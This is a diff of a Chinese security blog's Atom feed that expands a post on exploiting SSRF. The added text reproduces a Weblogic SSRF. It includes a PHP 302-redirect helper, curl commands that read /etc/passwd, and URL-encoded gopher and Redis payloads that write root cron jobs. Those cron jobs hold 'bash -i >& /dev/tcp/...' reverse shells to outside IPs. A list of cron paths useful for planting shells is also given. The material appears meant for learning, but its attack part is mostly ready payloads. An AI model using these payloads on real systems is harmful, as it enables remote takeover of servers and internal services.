@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-07-17T06:52:55.457Z</updated>
+  <updated>2017-07-18T05:34:42.438Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -16,11 +16,25 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>XML实体注入漏洞的利用与学习</title>
+    <link href="http://uknowsec.cn/posts/uncategorized/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
+    <id>http://uknowsec.cn/posts/uncategorized/XML实体注入漏洞的利用与学习.html</id>
+    <published>2017-07-18T05:34:42.000Z</published>
+    <updated>2017-07-18T05:34:42.438Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>SSRF漏洞的利用与学习</title>
     <link href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
     <id>http://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html</id>
     <published>2017-07-17T03:27:46.000Z</published>
-    <updated>2017-07-17T06:52:55.457Z</updated>
+    <updated>2017-07-18T05:27:04.811Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
@@ -39,7 +53,28 @@
 <p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
 <p>我们继续构造一个302跳转服务，代码如下302.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$schema = $_GET[&apos;s&apos;];</div><div class="line">$ip     = $_GET[&apos;i&apos;];</div><div class="line">$port   = $_GET[&apos;p&apos;];</div><div class="line">$query  = $_GET[&apos;q&apos;];</div><div class="line">if(empty($port))&#123;  </div><div class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </div><div class="line">&#125; else &#123;</div><div class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># dict protocol - 探测Redis</div><div class="line">dict://127.0.0.1:6379/info  </div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</div><div class="line"></div><div class="line"># file protocol - 任意文件读取</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol - 一键反弹Bash</div><div class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </div><div class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </div><div class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</div><div class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a></p>
+<h2 id="Weblogic-SSRF漏洞复现"><a href="#Weblogic-SSRF漏洞复现" class="headerlink" title="Weblogic SSRF漏洞复现"></a>Weblogic SSRF漏洞复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求" target="_blank" rel="external">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p>
+<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="探查服务端口"><a href="#探查服务端口" class="headerlink" title="探查服务端口"></a>探查服务端口</h4><p>在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001" target="_blank" rel="external">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</div><div class="line">Host: http://127.0.0.1:7001</div><div class="line">Content-Length: 133</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1:7001</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544</div><div class="line">Connection: close</div><div class="line"></div><div class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</div></pre></td></tr></table></figure></p>
+<p>返回以下信息，说明存在7001端口的服务器<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png" alt=""></p>
+<p>访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf1.png" alt=""></p>
+<p>访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf2.png" alt=""></p>
+<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通<br>返回<br>which did not have a valid SOAP content-type: null<br>说明存在redis服务</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf3.png" alt=""></p>
+<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /etc/</div><div class="line">config set dbfilename crontab</div><div class="line">save</div></pre></td></tr></table></figure>
+<p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf5.png" alt=""></p>
+<p>反弹shell（自己测试没有成功的反弹，附上p牛的图吧）</p>
+<p><img src="https://github.com/phith0n/vulhub/raw/master/weblogic/ssrf/5.png" alt=""></p>
+<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a><br><a href="https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="external">vulhub/weblogic/ssrf</a></p>
 ]]></content>
     
     <summary type="html">
@@ -2165,47 +2200,6 @@
 <h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac test.java</div><div class="line">java test</div></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg" alt=""></p>
 ]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Ubuntu 16.10下gcc/g++编译器使用简介</title>
-    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8Bgcc-g-%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html"/>
-    <id>http://uknowsec.cn/posts/linux/第三周-Ubuntu-16-10下gcc-g-编译器使用简介.html</id>
-    <published>2017-03-12T03:23:11.000Z</published>
-    <updated>2017-05-01T13:49:34.581Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h1 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GCC（GNU Compiler Collection，GNU编译器套装），是一套由 GNU 开发的编程语言编译器。它是一套以 GPL 及 LGPL 许可证所发行的自由软件，也是 GNU计划 的关键部分，亦是自由的 类Unix 及苹果计算机 Mac OS X 操作系统的标准编译器。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。</p>
-<h2 id="简单编译"><a href="#简单编译" class="headerlink" title="简单编译"></a>简单编译</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	printf(&quot;hello world!\n&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这个程序，一步到位的编译指令是:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.c -o test</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114049.jpg" alt=""></p>
-<p>实质上，上述编译过程是分为四个阶段进行的，即预处理(也称预编译，Preprocessing)、编译(Compilation)、汇编 (Assembly)和连接(Linking)。</p>
-<h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -E test.c -o test.i</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE2017031211404.jpg" alt=""></p>
-<p>可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。后面那条指令，是直接在命令行窗口中输出预处理后的代码.<br>gcc的-E选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将stdio.h 文件中的内容插入到test.c中了。</p>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>预处理之后，可直接对生成的test.i文件编译，生成汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -S test.i -o test.s</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114625.jpg" alt=""><br>gcc的-S选项，表示在程序编译期间，在生成汇编代码后，停止，-o输出汇编代码文件。</p>
-<h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>对于上一小节中生成的汇编代码文件test.s，gas汇编器负责将其编译为目标文件，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -c test.s -o test.o</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114751.jpg" alt=""></p>
-<h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>gcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。<br>对于上一小节中生成的test.o，将其与Ｃ标准输入输出库进行连接，最终生成程序test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.o -o test</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114928.jpg" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./test      //执行程序test</div></pre></td></tr></table></figure>
-<h1 id="G"><a href="#G" class="headerlink" title="G++"></a>G++</h1><h2 id="编译流程"><a href="#编译流程" class="headerlink" title="编译流程"></a>编译流程</h2><h3 id="预处理-Pre-Processing"><a href="#预处理-Pre-Processing" class="headerlink" title="预处理-Pre-Processing"></a>预处理-Pre-Processing</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  -E  test.cpp  -o  test.i</div></pre></td></tr></table></figure>
-<h3 id="编译-Compiling"><a href="#编译-Compiling" class="headerlink" title="编译-Compiling"></a>编译-Compiling</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  -S  test.i  -o   test.s</div></pre></td></tr></table></figure>
-<h3 id="汇编-Assembling"><a href="#汇编-Assembling" class="headerlink" title="汇编-Assembling"></a>汇编-Assembling</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  -c  test.s  -o  test.o</div></pre></td></tr></table></figure>
-<h3 id="链接-Linking"><a href="#链接-Linking" class="headerlink" title="链接-Linking"></a>链接-Linking</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  test.o  -o  test</div></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
